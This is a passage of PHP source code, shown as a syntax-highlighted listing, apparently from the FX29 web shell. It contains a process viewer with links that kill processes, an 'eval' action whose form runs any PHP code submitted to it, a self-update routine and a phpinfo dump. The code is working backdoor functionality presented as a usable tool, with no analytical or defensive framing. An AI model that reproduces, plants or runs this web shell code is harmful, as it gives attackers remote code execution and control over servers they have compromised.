<span class="lineno">2323</span>             <span class="nv">$head</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;processes_sort=&quot;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;b&gt;&quot;</span><span class="o">.</span><span class="nv">$head</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/b&gt;&lt;/a&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2324</span>           <span class="p">}</span>
<span class="lineno">2325</span>         <span class="p">}</span>
<span class="lineno">2326</span>         <span class="nv">$head</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno">2327</span>         <span class="nv">$prcs</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno">2328</span>         <span class="k">foreach</span> <span class="p">(</span><span class="nv">$stack</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2329</span>           <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$line</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">2330</span>             <span class="nv">$line</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$line</span><span class="p">);</span>
<span class="lineno">2331</span>             <span class="nv">$line</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="nb">join</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nb">array_slice</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="mi">10</span><span class="p">));</span>
<span class="lineno">2332</span>             <span class="nv">$line</span> <span class="o">=</span> <span class="nb">array_slice</span><span class="p">(</span><span class="nv">$line</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">11</span><span class="p">);</span>
<span class="lineno">2333</span>             <span class="k">if</span> <span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="nb">get_current_user</span><span class="p">())</span> <span class="p">{</span> <span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;&lt;font class=&quot;on&quot;&gt;&#39;</span><span class="o">.</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2334</span>             <span class="nv">$line</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=processes&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;pid=&quot;</span><span class="o">.</span><span class="nv">$line</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;sig=9</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;u&gt;KILL&lt;/u&gt;&lt;/a&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2335</span>             <span class="nv">$prcs</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$line</span><span class="p">;</span>
<span class="lineno">2336</span>           <span class="p">}</span>
<span class="lineno">2337</span>         <span class="p">}</span>
<span class="lineno">2338</span>       <span class="p">}</span>
<span class="lineno">2339</span>       <span class="c1">#For Windows - Fixed By FaTaLisTiCz_Fx</span>
<span class="lineno">2340</span>       <span class="k">else</span> <span class="p">{</span>
<span class="lineno">2341</span>         <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$pid</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2342</span>           <span class="k">echo</span> <span class="s2">&quot;Killing PID &quot;</span><span class="o">.</span><span class="nv">$pid</span><span class="o">.</span><span class="s2">&quot;... &quot;</span><span class="p">;</span>
<span class="lineno">2343</span>           <span class="k">echo</span> <span class="nx">fx29exec</span><span class="p">(</span><span class="s2">&quot;taskkill /PID </span><span class="si">$pid</span><span class="s2"> /F&quot;</span><span class="p">);</span>
<span class="lineno">2344</span>         <span class="p">}</span>
<span class="lineno">2345</span>         <span class="k">while</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;  &quot;</span><span class="p">,</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">2346</span>         <span class="k">while</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;=&quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;=&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">2347</span>         <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">convert_cyr_string</span><span class="p">(</span><span class="nv">$ret</span><span class="p">,</span><span class="s2">&quot;d&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="lineno">2348</span>         <span class="nv">$stack</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span>
<span class="lineno">2349</span>         <span class="nb">unset</span><span class="p">(</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
<span class="lineno">2350</span>         <span class="nv">$stack</span> <span class="o">=</span> <span class="nb">array_values</span><span class="p">(</span><span class="nv">$stack</span><span class="p">);</span>
<span class="lineno">2351</span>         <span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;Image Name&quot;</span><span class="p">,</span><span class="s2">&quot;Image-Name&quot;</span><span class="p">,</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="lineno">2352</span>         <span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;Session Name&quot;</span><span class="p">,</span><span class="s2">&quot;Session-Name&quot;</span><span class="p">,</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="lineno">2353</span>         <span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;Mem Usage&quot;</span><span class="p">,</span><span class="s2">&quot;Memory-Usage&quot;</span><span class="p">,</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="lineno">2354</span>         <span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.=</span> <span class="s2">&quot; KILL&quot;</span><span class="p">;</span>
<span class="lineno">2355</span>         <span class="nv">$head</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="lineno">2356</span>         <span class="nv">$stack</span> <span class="o">=</span> <span class="nb">array_slice</span><span class="p">(</span><span class="nv">$stack</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
<span class="lineno">2357</span>         <span class="nv">$head</span> <span class="o">=</span> <span class="nb">array_values</span><span class="p">(</span><span class="nv">$head</span><span class="p">);</span>
<span class="lineno">2358</span>         <span class="k">if</span> <span class="p">(</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&quot;a&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2359</span>           <span class="nv">$y</span> <span class="o">=</span> <span class="s2">&quot; &lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;processes_sort=&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;a</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=sort_desc</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Desc</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/a&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2360</span>         <span class="p">}</span>
<span class="lineno">2361</span>         <span class="k">else</span> <span class="p">{</span>
<span class="lineno">2362</span>           <span class="nv">$y</span> <span class="o">=</span> <span class="s2">&quot; &lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;processes_sort=&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;d</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=sort_asc</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Asc</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/a&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2363</span>         <span class="p">}</span>
<span class="lineno">2364</span>         <span class="k">if</span> <span class="p">(</span><span class="nv">$k</span> <span class="o">&gt;</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$head</span><span class="p">))</span> <span class="p">{</span><span class="nv">$k</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$head</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;}</span>
<span class="lineno">2365</span>         <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$head</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2366</span>           <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">!=</span> <span class="nv">$k</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$head</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;processes_sort=&quot;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;b&gt;&quot;</span><span class="o">.</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$head</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&lt;/b&gt;&lt;/a&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2367</span>         <span class="p">}</span>
<span class="lineno">2368</span>         <span class="nv">$prcs</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno">2369</span>         <span class="nb">unset</span><span class="p">(</span><span class="nv">$stack</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="lineno">2370</span>         <span class="k">foreach</span> <span class="p">(</span><span class="nv">$stack</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2371</span>           <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$line</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">2372</span>             <span class="nv">$line</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$line</span><span class="p">);</span>
<span class="lineno">2373</span>             <span class="nv">$line</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$line</span><span class="p">[</span><span class="mi">4</span><span class="p">]);</span>
<span class="lineno">2374</span>             <span class="nv">$line</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">4</span><span class="p">])</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">;</span>
<span class="lineno">2375</span>             <span class="nb">unset</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">5</span><span class="p">]);</span>
<span class="lineno">2376</span>             <span class="nv">$line</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=processes&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;pid=&quot;</span><span class="o">.</span><span class="nv">$line</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;u&gt;KILL&lt;/u&gt;&lt;/a&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2377</span>             <span class="nv">$prcs</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$line</span><span class="p">;</span>
<span class="lineno">2378</span>           <span class="p">}</span>
<span class="lineno">2379</span>         <span class="p">}</span>
<span class="lineno">2380</span>       <span class="p">}</span>
<span class="lineno">2381</span>       <span class="nv">$head</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&lt;b&gt;&quot;</span><span class="o">.</span><span class="nv">$head</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/b&gt;&quot;</span><span class="o">.</span><span class="nv">$y</span><span class="p">;</span>
<span class="lineno">2382</span>       <span class="nv">$v</span> <span class="o">=</span> <span class="nv">$processes_sort</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="lineno">2383</span>       <span class="nb">usort</span><span class="p">(</span><span class="nv">$prcs</span><span class="p">,</span><span class="s2">&quot;tabsort&quot;</span><span class="p">);</span>
<span class="lineno">2384</span>       <span class="k">if</span> <span class="p">(</span><span class="nv">$processes_sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;d&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$prcs</span> <span class="o">=</span> <span class="nb">array_reverse</span><span class="p">(</span><span class="nv">$prcs</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">2385</span>       <span class="nv">$tab</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno">2386</span>       <span class="nv">$tab</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$head</span><span class="p">;</span>
<span class="lineno">2387</span>       <span class="nv">$tab</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$tab</span><span class="p">,</span><span class="nv">$prcs</span><span class="p">);</span>
<span class="lineno">2388</span>       <span class="k">echo</span> <span class="s2">&quot;&lt;table class=</span><span class="se">\&quot;</span><span class="s2">explorer</span><span class="se">\&quot;</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">2389</span>       <span class="k">foreach</span><span class="p">(</span><span class="nv">$tab</span> <span class="k">as</span> <span class="nv">$i</span><span class="o">=&gt;</span><span class="nv">$k</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2390</span>         <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&lt;tr&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2391</span>         <span class="k">foreach</span><span class="p">(</span><span class="nv">$k</span> <span class="k">as</span> <span class="nv">$j</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2392</span>           <span class="k">if</span> <span class="p">(</span><span class="nx">is_windows</span><span class="p">()</span> <span class="k">and</span> <span class="nv">$i</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="k">and</span> <span class="nv">$j</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$v</span> <span class="o">=</span> <span class="nx">view_size</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">2393</span>           <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2394</span>         <span class="p">}</span>
<span class="lineno">2395</span>         <span class="k">echo</span> <span class="s2">&quot;&lt;/tr&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">2396</span>       <span class="p">}</span>
<span class="lineno">2397</span>       <span class="k">echo</span> <span class="s2">&quot;&lt;/table&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">2398</span>     <span class="p">}</span>
<span class="lineno">2399</span>   <span class="p">}</span>
<span class="lineno">2400</span>   <span class="c1">###[ EVAL ]###</span>
<span class="lineno">2401</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;eval&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2402</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$eval</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">2403</span>       <span class="k">echo</span> <span class="s2">&quot;&lt;div class=barheader&gt;Result of execution this PHP-code:&lt;/div&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">2404</span>       <span class="nv">$tmp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span>
<span class="lineno">2405</span>       <span class="nv">$olddir</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">);</span>
<span class="lineno">2406</span>       <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno">2407</span>       <span class="k">if</span> <span class="p">(</span><span class="nv">$tmp</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2408</span>         <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span>
<span class="lineno">2409</span>         <span class="k">eval</span><span class="p">(</span><span class="nv">$eval</span><span class="p">);</span>
<span class="lineno">2410</span>         <span class="nv">$ret</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span>
<span class="lineno">2411</span>         <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">convert_cyr_string</span><span class="p">(</span><span class="nv">$ret</span><span class="p">,</span><span class="s2">&quot;d&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="lineno">2412</span>         <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span>
<span class="lineno">2413</span>         <span class="k">echo</span> <span class="nv">$tmp</span><span class="p">;</span>
<span class="lineno">2414</span>         <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$eval_txt</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2415</span>           <span class="nv">$rows</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$ret</span><span class="p">))</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
<span class="lineno">2416</span>           <span class="k">if</span> <span class="p">(</span><span class="nv">$rows</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span><span class="nv">$rows</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;}</span>
<span class="lineno">2417</span>           <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;&lt;textarea cols=</span><span class="se">\&quot;</span><span class="s2">125</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$rows</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> readonly&gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$ret</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/textarea&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2418</span>         <span class="p">}</span>
<span class="lineno">2419</span>         <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="nv">$ret</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">2420</span>       <span class="p">}</span>
<span class="lineno">2421</span>       <span class="k">else</span> <span class="p">{</span>
<span class="lineno">2422</span>         <span class="k">if</span> <span class="p">(</span><span class="nv">$eval_txt</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2423</span>           <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;&lt;textarea cols=</span><span class="se">\&quot;</span><span class="s2">125</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">10</span><span class="se">\&quot;</span><span class="s2"> readonly&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2424</span>           <span class="k">eval</span><span class="p">(</span><span class="nv">$eval</span><span class="p">);</span>
<span class="lineno">2425</span>           <span class="k">echo</span> <span class="s2">&quot;&lt;/textarea&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2426</span>         <span class="p">}</span>
<span class="lineno">2427</span>         <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="nv">$ret</span><span class="p">;}</span>
<span class="lineno">2428</span>       <span class="p">}</span>
<span class="lineno">2429</span>       <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$olddir</span><span class="p">);</span>
<span class="lineno">2430</span>     <span class="p">}</span>
<span class="lineno">2431</span>     <span class="k">else</span> <span class="p">{</span>
<span class="lineno">2432</span>       <span class="k">echo</span> <span class="s2">&quot;&lt;div class=</span><span class="se">\&quot;</span><span class="s2">barheader</span><span class="se">\&quot;</span><span class="s2">&gt;.: PHP-code Execution :.&lt;/div&gt;</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">2433</span>       <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$eval_txt</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$eval_txt</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">2434</span>     <span class="p">}</span>
<span class="lineno">2435</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">2436</span> 
<span class="lineno">2437</span> 
<span class="lineno">2438</span> <span class="x">&lt;form name=&quot;f_eval&quot; action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot; method=&quot;POST&quot;&gt;</span>
<span class="lineno">2439</span> <span class="x">    &lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;eval&quot;&gt;</span>
<span class="lineno">2440</span> <span class="x">    &lt;textarea name=&quot;eval&quot; cols=&quot;125&quot; rows=&quot;10&quot;&gt;</span>
<span class="lineno">2441</span> <span class="cp">&lt;?php</span>
<span class="lineno">2442</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nv">$eval</span><span class="p">);</span>
<span class="lineno">2443</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">2444</span> 
<span class="lineno">2445</span> 
<span class="lineno">2446</span> <span class="x">    &lt;/textarea&gt;</span>
<span class="lineno">2447</span> <span class="x">    &lt;input type=&quot;hidden&quot; name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;&lt;br&gt;</span>
<span class="lineno">2448</span> <span class="x">    &lt;input type=&quot;submit&quot; value=&quot;Execute&quot;&gt; Display in text-area &lt;input type=&quot;checkbox&quot; name=&quot;eval_txt&quot; value=&quot;1&quot;</span><span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$eval_txt</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot; checked&quot;</span><span class="p">;</span> <span class="p">}</span> <span class="cp">?&gt;</span><span class="x">&gt;</span>
<span class="lineno">2449</span> <span class="x">&lt;/form&gt;</span>
<span class="lineno">2450</span> <span class="cp">&lt;?php</span>
<span class="lineno">2451</span>   <span class="p">}</span>
<span class="lineno">2452</span>   <span class="c1">###[ UPDATE ]###</span>
<span class="lineno">2453</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;update&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">2454</span>     <span class="nv">$ret</span> <span class="o">=</span> <span class="nx">fx29sh_getupdate</span><span class="p">(</span><span class="o">@</span><span class="nv">$confirmupdate</span><span class="p">);</span>
<span class="lineno">2455</span>     <span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;</span><span class="si">$ret</span><span class="s2">&lt;/b&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2456</span>     <span class="k">if</span> <span class="p">(</span><span class="nb">stristr</span><span class="p">(</span><span class="nv">$ret</span><span class="p">,</span><span class="s2">&quot;new version&quot;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">2457</span>       <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;&lt;br&gt;&lt;input type=button onclick=</span><span class="se">\&quot;</span><span class="s2">location.href=&#39;&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=update&amp;confirmupdate=1&#39;;</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Update now</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2458</span>     <span class="p">}</span>
<span class="lineno">2459</span>   <span class="p">}</span>
<span class="lineno">2460</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;phpinfo&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="nb">phpinfo</span><span class="p">();</span> <span class="nx">fx29shexit</span><span class="p">();</span> <span class="p">}</span>
